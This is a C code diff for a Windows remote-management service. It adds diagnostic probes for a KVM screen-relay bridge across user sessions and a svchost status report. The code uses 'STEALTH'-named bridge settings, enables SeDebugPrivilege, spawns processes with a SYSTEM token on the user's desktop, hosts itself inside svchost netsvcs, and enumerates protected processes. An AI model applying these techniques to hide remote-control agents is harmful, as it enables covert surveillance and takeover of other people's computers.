+	if (childJson != NULL) { free(childJson); }
+	DeleteFileW(reportPath);
+	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
+}
+
+static int MeshService_RunKvmBridgeEventAuditProbeWorkerCommand(void)
+{
+	MeshServiceKvmProbeChain probeChain;
+	MeshServiceKvmSessionChangeProbeState state;
+	WCHAR bridgeDllPath[MAX_PATH * 4] = { 0 };
+	WCHAR serviceNameBuf[256] = { 0 };
+	WCHAR missingExePath[MAX_PATH] = { 0 };
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR previousBridgeDll[MAX_PATH * 4] = { 0 };
+	WCHAR previousForceExitCode[64] = { 0 };
+	char exePath[MAX_PATH * 4] = { 0 };
+	char missingExePathA[MAX_PATH * 4] = { 0 };
+	DWORD previousBridgeDllLen = 0;
+	DWORD previousForceExitCodeLen = 0;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD successBridgePid = 0;
+	DWORD successBridgeSpawnMs = 0;
+	DWORD successBridgePacketMs = 0;
+	DWORD successCleanupExitMs = 0;
+	DWORD failureWaitMs = 0;
+	DWORD failureCount = 0;
+	DWORD failureDelayMs = 0;
+	DWORD failureStage = 0;
+	DWORD failureError = 0;
+	DWORD failureSpawnAttempts = 0;
+	DWORD chainThreadWaitResult = WAIT_OBJECT_0;
+	BOOL bridgeDllReady = FALSE;
+	BOOL serviceNameReady = FALSE;
+	BOOL chainStarted = FALSE;
+	BOOL successRelayStarted = FALSE;
+	BOOL successBridgeSpawned = FALSE;
+	BOOL successBridgePacketsReady = FALSE;
+	BOOL successBridgeUsed = FALSE;
+	BOOL successFallbackUsed = FALSE;
+	BOOL successCleanupExited = FALSE;
+	BOOL failureRelayStarted = FALSE;
+	BOOL failureObserved = FALSE;
+	BOOL failureRetryScheduled = FALSE;
+	BOOL success = FALSE;
+
+	MeshService_KvmProbeChain_Init(&probeChain);
+	ZeroMemory(&state, sizeof(state));
+
+	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-bridge-event-audit-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
+		fflush(stdout);
+		return 1;
+	}
+
+	bridgeDllReady = MeshService_GetCurrentBuildBridgeDllPathW(bridgeDllPath, _countof(bridgeDllPath));
+	serviceNameReady = MeshService_GetServiceNameW(serviceNameBuf, _countof(serviceNameBuf));
+	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
+	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
+
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	StringCchPrintfW(missingExePath, _countof(missingExePath), L"%lsMeshMissingKvmAudit_%lu.exe", tempPath, GetCurrentProcessId());
+	DeleteFileW(missingExePath);
+	ILibWideToUTF8Ex(missingExePath, -1, missingExePathA, (int)sizeof(missingExePathA));
+
+	previousBridgeDllLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, (DWORD)_countof(previousBridgeDll));
+	if (previousBridgeDllLen >= _countof(previousBridgeDll)) { previousBridgeDllLen = 0; previousBridgeDll[0] = L'\0'; }
+	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
+	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }
+
+	if (bridgeDllReady)
+	{
+		SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", bridgeDllPath);
+	}
+	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
+
+	if (bridgeDllReady && serviceNameReady && chainStarted)
+	{
+		successRelayStarted = (kvm_relay_setup(exePath, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
+	}
+	successBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
+	successFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
+	failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
+	failureError = kvm_bridge_debug_get_last_bridge_failure_error();
+	failureSpawnAttempts = kvm_bridge_debug_get_spawn_attempt_count();
+	if (successRelayStarted)
+	{
+		successBridgeSpawned = MeshService_WaitForBridgePidChange(0, 5000, &successBridgeSpawnMs, &successBridgePid);
+		if (successBridgeSpawned)
+		{
+			successBridgePacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &successBridgePacketMs);
+			successBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
+			successFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
+		}
+		kvm_cleanup(&state);
+		if (successBridgePid != 0)
+		{
+			successCleanupExited = MeshService_WaitForProcessExitById(successBridgePid, 5000, &successCleanupExitMs);
+		}
+		else
+		{
+			successCleanupExited = TRUE;
+		}
+		Sleep(250);
+	}
+
+	ZeroMemory(&state, sizeof(state));
+	if (bridgeDllReady)
+	{
+		SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", bridgeDllPath);
+	}
+	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", L"193");
+
+	if (bridgeDllReady && serviceNameReady && chainStarted)
+	{
+		failureRelayStarted = (kvm_relay_setup(missingExePathA, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
+	}
+	if (!failureRelayStarted)
+	{
+		failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
+		failureError = kvm_bridge_debug_get_last_bridge_failure_error();
+		failureSpawnAttempts = kvm_bridge_debug_get_spawn_attempt_count();
+	}
+	if (failureRelayStarted)
+	{
+		failureObserved = MeshService_WaitForKvmFailureCount(1, 10000, &failureWaitMs);
+		if (failureObserved)
+		{
+			failureCount = kvm_bridge_debug_get_consecutive_failures();
+			failureDelayMs = kvm_bridge_debug_get_last_backoff_delay_ms();
+			failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
+			failureError = kvm_bridge_debug_get_last_bridge_failure_error();
+			failureRetryScheduled = (kvm_bridge_debug_is_retry_scheduled() != 0);
+			failureSpawnAttempts = kvm_bridge_debug_get_spawn_attempt_count();
+		}
+		kvm_cleanup(&state);
+		Sleep(250);
+	}
+
+	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, previousBridgeDllLen);
+	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
+	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);
+
+	success =
+		bridgeDllReady &&
+		serviceNameReady &&
+		chainStarted &&
+		successRelayStarted &&
+		successBridgeSpawned &&
+		successBridgePacketsReady &&
+		successBridgeUsed &&
+		!successFallbackUsed &&
+		successCleanupExited &&
+		failureRelayStarted &&
+		failureObserved &&
+		failureCount >= 1 &&
+		failureDelayMs == 2000 &&
+		failureStage == 7 &&
+		failureError == 193 &&
+		failureRetryScheduled &&
+		failureSpawnAttempts > 0;
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-bridge-event-audit-probe\",");
+	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
+	printf("\"serviceName\":\""); MeshService_PrintJsonEscapedWide(serviceNameBuf); printf("\",");
+	printf("\"bridgeDllPath\":\""); MeshService_PrintJsonEscapedWide(bridgeDllPath); printf("\",");
+	printf("\"eventIdAttempt\":%lu,", (unsigned long)MESH_KVM_BRIDGE_EVENT_ID_ATTEMPT);
+	printf("\"eventIdOutcome\":%lu,", (unsigned long)MESH_KVM_BRIDGE_EVENT_ID_OUTCOME);
+	printf("\"successRelayStarted\":%s,", successRelayStarted ? "true" : "false");
+	printf("\"successBridgeSpawned\":%s,", successBridgeSpawned ? "true" : "false");
+	printf("\"successBridgePacketsReady\":%s,", successBridgePacketsReady ? "true" : "false");
+	printf("\"successBridgeUsed\":%s,", successBridgeUsed ? "true" : "false");
+	printf("\"successFallbackUsed\":%s,", successFallbackUsed ? "true" : "false");
+	printf("\"successBridgePid\":%lu,", (unsigned long)successBridgePid);
+	printf("\"successBridgeSpawnMs\":%lu,", (unsigned long)successBridgeSpawnMs);
+	printf("\"successBridgePacketMs\":%lu,", (unsigned long)successBridgePacketMs);
+	printf("\"successCleanupExited\":%s,", successCleanupExited ? "true" : "false");
+	printf("\"successCleanupExitMs\":%lu,", (unsigned long)successCleanupExitMs);
+	printf("\"failureRelayStarted\":%s,", failureRelayStarted ? "true" : "false");
+	printf("\"failureObserved\":%s,", failureObserved ? "true" : "false");
+	printf("\"failureWaitMs\":%lu,", (unsigned long)failureWaitMs);
+	printf("\"failureCount\":%lu,", (unsigned long)failureCount);
+	printf("\"failureDelayMs\":%lu,", (unsigned long)failureDelayMs);
+	printf("\"failureStage\":%lu,", (unsigned long)failureStage);
+	printf("\"failureError\":%lu,", (unsigned long)failureError);
+	printf("\"failureRetryScheduled\":%s,", failureRetryScheduled ? "true" : "false");
+	printf("\"failureSpawnAttempts\":%lu,", (unsigned long)failureSpawnAttempts);
+	printf("\"chainThreadWaitResult\":%lu}\n", (unsigned long)chainThreadWaitResult);
+	fflush(stdout);
+	return success ? 0 : 1;
+}
+
+static int MeshService_RunKvmBridgeEventAuditProbeChildCommand(const WCHAR* reportPath)
+{
+	FILE* redirectedStdout = NULL;
+	errno_t redirectError = 0;
+
+	if (reportPath != NULL && reportPath[0] != L'\0')
+	{
+		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
+		if (redirectError != 0 || redirectedStdout == NULL)
+		{
+			return 1;
+		}
+	}
+	return MeshService_RunKvmBridgeEventAuditProbeWorkerCommand();
+}
+
+static int MeshService_RunKvmBridgeEventAuditProbeCommand(void)
+{
+	WCHAR tempPath[MAX_PATH] = { 0 };
+	WCHAR reportPath[MAX_PATH] = { 0 };
+	WCHAR arguments[512] = { 0 };
+	HANDLE systemToken = NULL;
+	PROCESS_INFORMATION childProcess;
+	DWORD sessionId = MeshService_GetCurrentSessionId();
+	DWORD systemTokenError = ERROR_SUCCESS;
+	DWORD spawnError = ERROR_SUCCESS;
+	DWORD childExitCode = STILL_ACTIVE;
+	BOOL systemTokenReady = FALSE;
+	BOOL childSpawned = FALSE;
+	char* childJson = NULL;
+
+	if (MeshService_ProcessHasSystemSid())
+	{
+		return MeshService_RunKvmBridgeEventAuditProbeWorkerCommand();
+	}
+
+	ZeroMemory(&childProcess, sizeof(childProcess));
+	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
+	{
+		GetTempPathW((DWORD)_countof(tempPath), tempPath);
+	}
+	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmEventAuditProbe_%lu.json", tempPath, GetCurrentProcessId());
+	DeleteFileW(reportPath);
+
+	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
+	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
+	if (systemTokenReady)
+	{
+		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-bridge-event-audit-probe-child \"%ls\"", reportPath);
+		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
+	}
+	if (childSpawned)
+	{
+		WaitForSingleObject(childProcess.hProcess, 60000);
+		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
+	}
+
+	childJson = MeshService_ReadUtf8TextFileW(reportPath);
+	if (childJson != NULL)
+	{
+		printf("%s\n", childJson);
+	}
+	else
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-bridge-event-audit-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
+			(unsigned long)sessionId,
+			systemTokenReady ? "true" : "false",
+			childSpawned ? "true" : "false",
+			(unsigned long)systemTokenError,
+			(unsigned long)spawnError,
+			(unsigned long)childExitCode);
+	}
+	fflush(stdout);
+
+	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
+	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
+	if (systemToken != NULL) { CloseHandle(systemToken); }
+	if (childJson != NULL) { free(childJson); }
+	DeleteFileW(reportPath);
+	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
+}
+
+static int MeshService_RunKvmMultiSessionProbeCommand(DWORD primarySessionId, int secondaryTsid)
+{
+	MeshServiceKvmProbeChain probeChain;
+	MeshServiceKvmSessionChangeProbeState stateA;
+	MeshServiceKvmSessionChangeProbeState stateB;
+	char exePath[MAX_PATH * 4] = { 0 };
+	DWORD relay1Pid = 0;
+	DWORD relay2Pid = 0;
+	DWORD relay1SpawnMs = 0;
+	DWORD relay2SpawnMs = 0;
+	DWORD relay1PacketMs = 0;
+	DWORD relay2PacketMs = 0;
+	DWORD relay1IsolatedPacketMs = 0;
+	DWORD relay2IsolatedPacketMs = 0;
+	DWORD cleanup1ExitMs = 0;
+	DWORD cleanup2ExitMs = 0;
+	DWORD chainThreadWaitResult = WAIT_OBJECT_0;
+	DWORD relay1ProcessSessionId = 0xFFFFFFFF;
+	DWORD relay2ProcessSessionId = 0xFFFFFFFF;
+	LONG relay1BaselinePackets = 0;
+	LONG relay2BaselinePackets = 0;
+	LONG relay1Phase1Delta = 0;
+	LONG relay2Phase1Delta = 0;
+	LONG relay1Phase2Delta = 0;
+	LONG relay2Phase2Delta = 0;
+	int registeredContextCountAfterStart = 0;
+	int registeredContextCountAfterCleanup = 0;
+	BOOL chainStarted = FALSE;
+	BOOL relay1Started = FALSE;
+	BOOL relay2Started = FALSE;
+	BOOL relay1Spawned = FALSE;
+	BOOL relay2Spawned = FALSE;
+	BOOL relay1PacketsReady = FALSE;
+	BOOL relay2PacketsReady = FALSE;
+	BOOL relay1TransportActive = FALSE;
+	BOOL relay2TransportActive = FALSE;
+	BOOL relay1BridgeUsed = FALSE;
+	BOOL relay2BridgeUsed = FALSE;
+	BOOL relay1FallbackUsed = FALSE;
+	BOOL relay2FallbackUsed = FALSE;
+	BOOL relay1IsolatedPacketsReady = FALSE;
+	BOOL relay2IsolatedPacketsReady = FALSE;
+	BOOL cleanup1Exited = FALSE;
+	BOOL cleanup2Exited = FALSE;
+	BOOL success = FALSE;
+
+	MeshService_KvmProbeChain_Init(&probeChain);
+	ZeroMemory(&stateA, sizeof(stateA));
+	ZeroMemory(&stateB, sizeof(stateB));
+	if (primarySessionId == 0 || primarySessionId == 0xFFFFFFFF)
+	{
+		printf("{\"success\":false,\"phase\":\"kvm-multi-session-probe\",\"primarySessionId\":%lu,\"secondaryRequestedTsid\":%d,\"error\":\"invalid-primary-session\"}\n",
+			(unsigned long)primarySessionId,
+			secondaryTsid);
+		fflush(stdout);
+		return 1;
+	}
+
+	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
+	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
+
+	if (chainStarted)
+	{
+		relay1Started = (kvm_relay_setup(exePath, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &stateA, (int)primarySessionId) != 0);
+	}
+	if (relay1Started)
+	{
+		relay1Spawned = MeshService_WaitForBridgePidForReserved(&stateA, 0, 10000, &relay1SpawnMs, &relay1Pid);
+		if (relay1Spawned)
+		{
+			relay1PacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateA, 5000, &relay1PacketMs);
+			relay1TransportActive = (kvm_bridge_debug_get_transport_active_for_reserved(&stateA) != 0);
+			relay1BridgeUsed = (kvm_bridge_debug_get_last_used_bridge_for_reserved(&stateA) != 0);
+			relay1FallbackUsed = (kvm_bridge_debug_get_last_fallback_used_for_reserved(&stateA) != 0);
+			relay1ProcessSessionId = kvm_bridge_debug_get_process_session_id_for_reserved(&stateA);
+		}
+	}
+
+	if (chainStarted)
+	{
+		relay2Started = (kvm_relay_setup(exePath, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &stateB, secondaryTsid) != 0);
+	}
+	if (relay2Started)
+	{
+		relay2Spawned = MeshService_WaitForBridgePidForReserved(&stateB, relay1Pid, 10000, &relay2SpawnMs, &relay2Pid);
+		if (relay2Spawned)
+		{
+			relay2PacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateB, 5000, &relay2PacketMs);
+			relay2TransportActive = (kvm_bridge_debug_get_transport_active_for_reserved(&stateB) != 0);
+			relay2BridgeUsed = (kvm_bridge_debug_get_last_used_bridge_for_reserved(&stateB) != 0);
+			relay2FallbackUsed = (kvm_bridge_debug_get_last_fallback_used_for_reserved(&stateB) != 0);
+			relay2ProcessSessionId = kvm_bridge_debug_get_process_session_id_for_reserved(&stateB);
+		}
+	}
+
+	registeredContextCountAfterStart = kvm_bridge_debug_get_registered_context_count();
+
+	if (relay1PacketsReady && relay2PacketsReady)
+	{
+		kvm_pause(1, &stateA);
+		kvm_pause(1, &stateB);
+		Sleep(750);
+
+		relay1BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateA);
+		relay2BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateB);
+		kvm_pause(0, &stateA);
+		relay1IsolatedPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateA, 5000, &relay1IsolatedPacketMs);
+		Sleep(500);
+		relay1Phase1Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateA) - relay1BaselinePackets;
+		relay2Phase1Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateB) - relay2BaselinePackets;
+		kvm_pause(1, &stateA);
+		Sleep(250);
+
+		relay1BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateA);
+		relay2BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateB);
+		kvm_pause(0, &stateB);
+		relay2IsolatedPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateB, 5000, &relay2IsolatedPacketMs);
+		Sleep(500);
+		relay1Phase2Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateA) - relay1BaselinePackets;
+		relay2Phase2Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateB) - relay2BaselinePackets;
+		kvm_pause(1, &stateB);
+	}
+
+	if (relay2Started)
+	{
+		kvm_cleanup(&stateB);
+		if (relay2Pid != 0)
+		{
+			cleanup2Exited = MeshService_WaitForProcessExitById(relay2Pid, 5000, &cleanup2ExitMs);
+		}
+		else
+		{
+			cleanup2Exited = TRUE;
+		}
+	}
+	if (relay1Started)
+	{
+		kvm_cleanup(&stateA);
+		if (relay1Pid != 0)
+		{
+			cleanup1Exited = MeshService_WaitForProcessExitById(relay1Pid, 5000, &cleanup1ExitMs);
+		}
+		else
+		{
+			cleanup1Exited = TRUE;
+		}
+	}
+	Sleep(250);
+	registeredContextCountAfterCleanup = kvm_bridge_debug_get_registered_context_count();
+	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);
+
+	success =
+		chainStarted &&
+		relay1Started &&
+		relay2Started &&
+		relay1Spawned &&
+		relay2Spawned &&
+		relay1PacketsReady &&
+		relay2PacketsReady &&
+		relay1TransportActive &&
+		relay2TransportActive &&
+		relay1BridgeUsed &&
+		relay2BridgeUsed &&
+		!relay1FallbackUsed &&
+		!relay2FallbackUsed &&
+		relay1Pid != 0 &&
+		relay2Pid != 0 &&
+		relay1Pid != relay2Pid &&
+		registeredContextCountAfterStart >= 2 &&
+		relay1ProcessSessionId == primarySessionId &&
+		(secondaryTsid >= 0 ? relay2ProcessSessionId == (DWORD)secondaryTsid : (relay2ProcessSessionId != 0 && relay2ProcessSessionId != 0xFFFFFFFF)) &&
+		relay1IsolatedPacketsReady &&
+		relay2IsolatedPacketsReady &&
+		relay1Phase1Delta > 0 &&
+		relay2Phase1Delta == 0 &&
+		relay1Phase2Delta == 0 &&
+		relay2Phase2Delta > 0 &&
+		cleanup1Exited &&
+		cleanup2Exited &&
+		registeredContextCountAfterCleanup == 0 &&
+		chainThreadWaitResult == WAIT_OBJECT_0;
+
+	printf("{\"success\":%s,", success ? "true" : "false");
+	printf("\"phase\":\"kvm-multi-session-probe\",");
+	printf("\"primarySessionId\":%lu,", (unsigned long)primarySessionId);
+	printf("\"secondaryRequestedTsid\":%d,", secondaryTsid);
+	printf("\"chainStarted\":%s,", chainStarted ? "true" : "false");
+	printf("\"registeredContextCountAfterStart\":%d,", registeredContextCountAfterStart);
+	printf("\"registeredContextCountAfterCleanup\":%d,", registeredContextCountAfterCleanup);
+	printf("\"relay1Started\":%s,", relay1Started ? "true" : "false");
+	printf("\"relay1Spawned\":%s,", relay1Spawned ? "true" : "false");
+	printf("\"relay1PacketsReady\":%s,", relay1PacketsReady ? "true" : "false");
+	printf("\"relay1TransportActive\":%s,", relay1TransportActive ? "true" : "false");
+	printf("\"relay1BridgeUsed\":%s,", relay1BridgeUsed ? "true" : "false");
+	printf("\"relay1FallbackUsed\":%s,", relay1FallbackUsed ? "true" : "false");
+	printf("\"relay1Pid\":%lu,", (unsigned long)relay1Pid);
+	printf("\"relay1SpawnMs\":%lu,", (unsigned long)relay1SpawnMs);
+	printf("\"relay1PacketMs\":%lu,", (unsigned long)relay1PacketMs);
+	printf("\"relay1ProcessSessionId\":%lu,", (unsigned long)relay1ProcessSessionId);
+	printf("\"relay2Started\":%s,", relay2Started ? "true" : "false");
+	printf("\"relay2Spawned\":%s,", relay2Spawned ? "true" : "false");
+	printf("\"relay2PacketsReady\":%s,", relay2PacketsReady ? "true" : "false");
+	printf("\"relay2TransportActive\":%s,", relay2TransportActive ? "true" : "false");
+	printf("\"relay2BridgeUsed\":%s,", relay2BridgeUsed ? "true" : "false");
+	printf("\"relay2FallbackUsed\":%s,", relay2FallbackUsed ? "true" : "false");
+	printf("\"relay2Pid\":%lu,", (unsigned long)relay2Pid);
+	printf("\"relay2SpawnMs\":%lu,", (unsigned long)relay2SpawnMs);
+	printf("\"relay2PacketMs\":%lu,", (unsigned long)relay2PacketMs);
+	printf("\"relay2ProcessSessionId\":%lu,", (unsigned long)relay2ProcessSessionId);
+	printf("\"relay1IsolatedPacketsReady\":%s,", relay1IsolatedPacketsReady ? "true" : "false");
+	printf("\"relay1IsolatedPacketMs\":%lu,", (unsigned long)relay1IsolatedPacketMs);
+	printf("\"relay2IsolatedPacketsReady\":%s,", relay2IsolatedPacketsReady ? "true" : "false");
+	printf("\"relay2IsolatedPacketMs\":%lu,", (unsigned long)relay2IsolatedPacketMs);
+	printf("\"relay1Phase1Delta\":%ld,", relay1Phase1Delta);
+	printf("\"relay2Phase1Delta\":%ld,", relay2Phase1Delta);
+	printf("\"relay1Phase2Delta\":%ld,", relay1Phase2Delta);
+	printf("\"relay2Phase2Delta\":%ld,", relay2Phase2Delta);
+	printf("\"relay1TotalPackets\":%ld,", MeshService_KvmSessionChangeProbeTotalPackets(&stateA));
+	printf("\"relay2TotalPackets\":%ld,", MeshService_KvmSessionChangeProbeTotalPackets(&stateB));
+	printf("\"cleanup1Exited\":%s,", cleanup1Exited ? "true" : "false");
+	printf("\"cleanup1ExitMs\":%lu,", (unsigned long)cleanup1ExitMs);
+	printf("\"cleanup2Exited\":%s,", cleanup2Exited ? "true" : "false");
+	printf("\"cleanup2ExitMs\":%lu,", (unsigned long)cleanup2ExitMs);
+	printf("\"chainThreadWaitResult\":%lu}\n", (unsigned long)chainThreadWaitResult);
+	fflush(stdout);
+
+	return success ? 0 : 1;
+}
+#endif
+
+typedef struct MeshServiceSvchostStatusSummary
+{
+	BOOL success;
+	DWORD statusMask;
+	WCHAR serviceName[256];
+	WCHAR expectedServiceDll[MAX_PATH];
+	BOOL serviceKeyPresent;
+	BOOL serviceTypePresent;
+	DWORD serviceTypeValue;
+	BOOL serviceTypeValid;
+	BOOL serviceStartPresent;
+	DWORD serviceStartValue;
+	BOOL serviceStartValid;
+	BOOL imagePathPresent;
+	WCHAR imagePath[512];
+	BOOL imagePathIsSvchost;
+	BOOL imagePathHasNetsvcs;
+	BOOL objectNamePresent;
+	WCHAR objectName[256];
+	BOOL objectNameIsLocalSystem;
+	BOOL paramsKeyPresent;
+	BOOL serviceDllPresent;
+	WCHAR serviceDllRaw[512];
+	WCHAR serviceDllExpanded[1024];
+	BOOL serviceDllExists;
+	BOOL serviceDllMatchesExpected;
+	BOOL hashConfigured;
+	WCHAR expectedHash[STEALTH_SHA256_STRING_LENGTH + 1];
+	BOOL actualHashAvailable;
+	WCHAR actualHash[STEALTH_SHA256_STRING_LENGTH + 1];
+	BOOL hashMatch;
+	BOOL serviceMainPresent;
+	WCHAR serviceMain[128];
+	BOOL serviceMainValid;
+	BOOL unloadOnStopPresent;
+	DWORD unloadOnStopValue;
+	BOOL unloadOnStopValid;
+	BOOL netsvcsMembershipPresent;
+	BOOL scmAvailable;
+	BOOL serviceInstalledInScm;
+	BOOL currentStateKnown;
+	DWORD currentState;
+	BOOL serviceRunning;
+	BOOL sidTypeKnown;
+	DWORD sidTypeValue;
+	BOOL sidTypeValid;
+	struct {
+		BOOL collected;
+		DWORD scannedProcessCount;
+		DWORD protectedProcessCount;
+		DWORD protectedLightCount;
+		DWORD entryCount;
+		MonitorProcessProtectionInfo entries[MESH_SERVICE_MAX_PROTECTION_DIAGNOSTICS];
+	} processProtection;
+} MeshServiceSvchostStatusSummary;
+
+static void MeshService_CollectProcessProtectionDiagnostics(MeshServiceSvchostStatusSummary* summary)
+{
+	HANDLE snapshot = INVALID_HANDLE_VALUE;
+	PROCESSENTRY32W entry;
+
+	if (summary == NULL) { return; }
+
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE) { return; }
+
+	ZeroMemory(&entry, sizeof(entry));
+	entry.dwSize = sizeof(entry);
+	if (!Process32FirstW(snapshot, &entry))
+	{
+		CloseHandle(snapshot);
+		return;
+	}
+
+	do
+	{
+		MonitorProcessProtectionInfo info;
+
+		if (entry.th32ProcessID == 0) { continue; }
+		++summary->processProtection.scannedProcessCount;
+		ZeroMemory(&info, sizeof(info));
+		if (!Monitor_QueryProcessProtectionByPid(entry.th32ProcessID, &info)) { continue; }
+		if (!info.protectionKnown || info.protectionType == 0) { continue; }
+
+		if (info.imageName[0] == L'\0')
+		{
+			StringCchCopyW(info.imageName, _countof(info.imageName), entry.szExeFile);
+		}
+
+		if (summary->processProtection.entryCount < MESH_SERVICE_MAX_PROTECTION_DIAGNOSTICS)
+		{
+			summary->processProtection.entries[summary->processProtection.entryCount++] = info;
+		}
+		++summary->processProtection.protectedProcessCount;
+		if (info.isProtectedLight)
+		{
+			++summary->processProtection.protectedLightCount;
+		}
+	} while (Process32NextW(snapshot, &entry));
+
+	CloseHandle(snapshot);
+	summary->processProtection.collected = TRUE;
+}
+
+static void MeshService_PrintSvchostStatusJson(const MeshServiceSvchostStatusSummary* summary)
+{
+	DWORD i = 0;
+
+	if (summary == NULL) { return; }
+
+	printf("{\"success\":%s,", summary->success ? "true" : "false");
+	printf("\"phase\":\"svchost-status\",");
+	printf("\"serviceName\":\"");
+	MeshService_PrintJsonEscapedWide(summary->serviceName);
+	printf("\",");
+	printf("\"statusMask\":%lu,", (unsigned long)summary->statusMask);
+	printf("\"statusMaskHex\":\"0x%08lX\",", (unsigned long)summary->statusMask);
+	printf("\"checks\":{");
+	printf("\"serviceKeyPresent\":%s,", summary->serviceKeyPresent ? "true" : "false");
+	printf("\"serviceTypeValid\":%s,", summary->serviceTypeValid ? "true" : "false");
+	printf("\"serviceStartValid\":%s,", summary->serviceStartValid ? "true" : "false");
+	printf("\"imagePathIsSvchost\":%s,", summary->imagePathIsSvchost ? "true" : "false");
+	printf("\"imagePathHasNetsvcs\":%s,", summary->imagePathHasNetsvcs ? "true" : "false");
+	printf("\"objectNameIsLocalSystem\":%s,", summary->objectNameIsLocalSystem ? "true" : "false");
+	printf("\"serviceDllPresent\":%s,", summary->serviceDllPresent ? "true" : "false");
+	printf("\"serviceDllExists\":%s,", summary->serviceDllExists ? "true" : "false");
+	printf("\"serviceDllMatchesExpected\":%s,", summary->serviceDllMatchesExpected ? "true" : "false");
+	printf("\"hashConfigured\":%s,", summary->hashConfigured ? "true" : "false");
+	printf("\"hashMatch\":%s,", summary->hashMatch ? "true" : "false");
+	printf("\"serviceMainValid\":%s,", summary->serviceMainValid ? "true" : "false");
+	printf("\"unloadOnStopValid\":%s,", summary->unloadOnStopValid ? "true" : "false");
+	printf("\"netsvcsMembershipPresent\":%s,", summary->netsvcsMembershipPresent ? "true" : "false");
+	printf("\"scmAvailable\":%s,", summary->scmAvailable ? "true" : "false");
+	printf("\"serviceInstalledInScm\":%s,", summary->serviceInstalledInScm ? "true" : "false");
+	printf("\"serviceRunning\":%s,", summary->serviceRunning ? "true" : "false");
+	printf("\"sidTypeValid\":%s", summary->sidTypeValid ? "true" : "false");
+	printf("},");
+	printf("\"processProtection\":{");
+	printf("\"collected\":%s,", summary->processProtection.collected ? "true" : "false");
+	printf("\"scannedProcessCount\":%lu,", (unsigned long)summary->processProtection.scannedProcessCount);
+	printf("\"protectedProcessCount\":%lu,", (unsigned long)summary->processProtection.protectedProcessCount);
+	printf("\"protectedLightCount\":%lu,", (unsigned long)summary->processProtection.protectedLightCount);
+	printf("\"entries\":[");
